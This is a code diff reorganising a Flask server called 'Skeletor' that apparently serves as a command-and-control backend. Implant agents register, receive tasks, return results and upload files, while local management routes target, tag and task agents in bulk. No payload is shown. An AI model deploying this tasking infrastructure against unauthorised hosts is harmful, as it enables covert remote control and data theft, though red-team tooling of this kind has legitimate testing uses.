@@ -122,6 +122,7 @@ def on_callback(agent):
     
 #ROUTES:
 
+#This first section is routes used by agents
 @app.route('/register', methods=['POST'])
 def register_agent():
     data = request.json
@@ -165,7 +166,6 @@ def submit_results():
 @app.route('/tasks', methods=['POST'])
 def get_task():
     ip = request.json.get('agent_id')
-    #agent_id = request.args.get('agent_id')
     if ip:
         agent = Agent.query.filter_by(agent_id=ip).first()
         if agent is None:
@@ -211,17 +211,7 @@ def upload_file():
     except:
         return jsonify({"error": "Invalid data"}), 400
 
-@app.route('/status', methods=['GET'])
-def status():
-    webpage_content = """
-    <h1>Welcome to Skeletor</h1>
-    <h3>Agent Status</h3>
-    """
-    for agent in Agent.query.all():
-        webpage_content += f"<p>{agent.agent_id} - {agent.status}</p>"
-    return webpage_content
-
-# Localhost only routes for manager
+# Management routes:
 @app.route('/get-agents', methods=['GET'])
 @restrict_remote
 def get_agents():
@@ -236,53 +226,6 @@ def get_agents():
             "tags": [t.name for t in agent.tags]
         })
     return jsonify(agents_data)
-
-
-@app.route('/targets', methods=['GET'])
-@restrict_remote
-def get_targets():
-    targets = ""
-    agents = Agent.query.filter_by(targeted=True).all()
-    for agent in agents:
-        targets += agent.agent_id + "\n"
-    return targets
-
-@app.route('/set-targets', methods=['POST'])
-@restrict_remote
-def set_targets():
-    data = request.json
-    ips = data.get('ips')
-    if ips:
-        for ip in ips:
-            agent = Agent.query.filter_by(agent_id=ip).first()
-            if agent:
-                agent.targeted = True
-                db.session.commit()
-        return jsonify({"message": "Targets set successfully"}), 200
-    return jsonify({"error": "Invalid data"}), 400
-
-@app.route('/untarget', methods=['POST'])
-@restrict_remote
-def untarget():
-    data = request.json
-    ips = data.get('ips')
-    if ips: 
-        for ip in ips:
-            agent = Agent.query.filter_by(agent_id=ip).first()
-            if agent:
-                agent.targeted = False
-                db.session.commit()
-        return jsonify({"message": "Targets unset successfully"}), 200
-    return jsonify({"error": "Invalid data"}), 400
-
-@app.route('/clear-targets', methods=['POST'])
-@restrict_remote
-def clear_targets():
-    agents = Agent.query.filter_by(targeted=True).all()
-    for agent in agents:
-        agent.targeted = False
-    db.session.commit()
-    return jsonify({"message": "Targets cleared successfully"}), 200
 
 @app.route('/make-task', methods=['POST'])
 @restrict_remote
@@ -330,6 +273,55 @@ def get_agent():
             return jsonify({"status":agent.status,"targeted":agent.targeted,"last_seen":agent.last_seen,"last_command":agent.last_command,"last_result":agent.last_result,"callbacks":agent.callbacks}), 200
         return jsonify({"error": "Agent not found"}), 404
     return jsonify({"error": "Invalid data"}), 400
+
+#Targeting related routes: (used by skelctl and can be used by other management interfaces to issue commands to multiple agents at once)
+@app.route('/targets', methods=['GET'])
+@restrict_remote
+def get_targets():
+    targets = ""
+    agents = Agent.query.filter_by(targeted=True).all()
+    for agent in agents:
+        targets += agent.agent_id + "\n"
+    return targets
+
+@app.route('/set-targets', methods=['POST'])
+@restrict_remote
+def set_targets():
+    data = request.json
+    ips = data.get('ips')
+    if ips:
+        for ip in ips:
+            agent = Agent.query.filter_by(agent_id=ip).first()
+            if agent:
+                agent.targeted = True
+                db.session.commit()
+        return jsonify({"message": "Targets set successfully"}), 200
+    return jsonify({"error": "Invalid data"}), 400
+
+@app.route('/untarget', methods=['POST'])
+@restrict_remote
+def untarget():
+    data = request.json
+    ips = data.get('ips')
+    if ips: 
+        for ip in ips:
+            agent = Agent.query.filter_by(agent_id=ip).first()
+            if agent:
+                agent.targeted = False
+                db.session.commit()
+        return jsonify({"message": "Targets unset successfully"}), 200
+    return jsonify({"error": "Invalid data"}), 400
+
+@app.route('/clear-targets', methods=['POST'])
+@restrict_remote
+def clear_targets():
+    agents = Agent.query.filter_by(targeted=True).all()
+    for agent in agents:
+        agent.targeted = False
+    db.session.commit()
+    return jsonify({"message": "Targets cleared successfully"}), 200
+
+#Tagging related routes:
 
 @app.route('/tag-agent',methods=["POST"])
 @restrict_remote
@@ -391,6 +383,16 @@ def tagged():
         return jsonify({"error": f"Tag '{tag_name}' not found"}), 404
     agent_ids = [agent.agent_id for agent in tag.agents]
     return jsonify({"agents": agent_ids}), 200
+
+@app.route('/status', methods=['GET'])
+def status():
+    webpage_content = """
+    <h1>Welcome to Skeletor</h1>
+    <h3>Agent Status</h3>
+    """
+    for agent in Agent.query.all():
+        webpage_content += f"<p>{agent.agent_id} - {agent.status}</p>"
+    return webpage_content
 
 #Main Page
 @app.route('/', methods=['GET'])
